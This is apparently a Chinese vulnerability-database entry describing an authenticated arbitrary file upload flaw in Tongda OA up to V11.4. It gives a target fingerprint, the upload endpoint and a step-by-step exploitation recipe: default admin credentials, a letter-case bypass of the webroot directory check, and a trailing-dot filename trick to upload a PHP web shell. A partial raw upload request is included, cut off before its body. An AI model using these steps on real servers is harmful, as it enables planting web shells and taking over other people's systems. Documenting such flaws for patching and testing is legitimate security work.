# 通达OAmodule存在后台任意文件上传漏洞

- **系统**：通达OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`POST /module/upload/upload.php?encode=utf-8 HTTP/1.1`

**请求体 / payload**
```
1、使用默认密码admin，密码为空或采用通达OA任意用户登录登录后台；\

2、点击系统管理->系统参数设置->OA服务设置，找到网站根目录：D:\MYOA\webroot；\

3、点击系统管理->附件管理->添加存储目录，设置附件上传目录为网站根目录：\
存储目录设置为Webroot目录，标识id为100-255的整数，勾选将所有新附件存至该目录，描述随意：\
⚠️注意：在11.2以上版本会检测存储目录是否包含webroot关键词检测，所以采用大小写绕过：D:\MYOA\webrooT；\

4. 快捷菜单-个人文件柜-新建文件-在编辑器“多图上传”处上传图片
5. 修改文件名为“shell.php.”，利用windows的特性绕过黑名单上传php脚本文件，上传数据包如下：
Host: xx.xx.xx.xx:81
X_Requested_With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------296004247523879430461279754861
Content-Length: 1273
Origin: http://xx.xx.xx.xx:81
Referer: http://1.14.47.145:81/module/ueditor…（脚本共 1762 字，完整版见原文）
```

**其他**
- 通达OA module存在后台任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA 2017-通达OA V 11.4